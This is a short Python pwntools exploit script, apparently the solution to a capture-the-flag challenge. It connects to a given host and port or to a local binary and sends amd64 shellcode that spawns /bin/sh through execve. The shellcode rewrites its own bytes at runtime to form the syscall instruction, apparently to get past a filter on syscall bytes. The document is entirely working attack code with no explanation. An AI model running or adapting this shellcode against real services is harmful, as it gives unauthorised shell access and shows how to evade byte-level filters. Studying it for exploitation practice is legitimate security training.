#!/usr/bin/env python3
from pwn import *
import sys

context.arch = "amd64"
if len(sys.argv) == 3:
    io = remote(sys.argv[1], int(sys.argv[2]))

else:
    io = process("./deploy/prob")

shellcode = (
    b"\x48\x31\xf6"                                  # xor    rsi, rsi       ; argv = NULL
    b"\x48\x31\xd2"                                  # xor    rdx, rdx       ; envp = NULL
    b"\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00"      # movabs rdi, 0x68732f6e69622f ; "/bin/sh"
    b"\x57"                                          # push   rdi
    b"\x48\x89\xe7"                                  # mov    rdi, rsp       ; rdi = pointer to "/bin/sh"
    b"\x48\x31\xc0"                                  # xor    rax, rax
    b"\xb0\x3b"                                      # mov    al, 0x3b       ; syscall number for execve
    b"\x48\xff\x0d\x01\x00\x00\x00"
    b"\x0f\x06"
)

io.sendlineafter(b"shellcode > ", shellcode)
io.interactive()
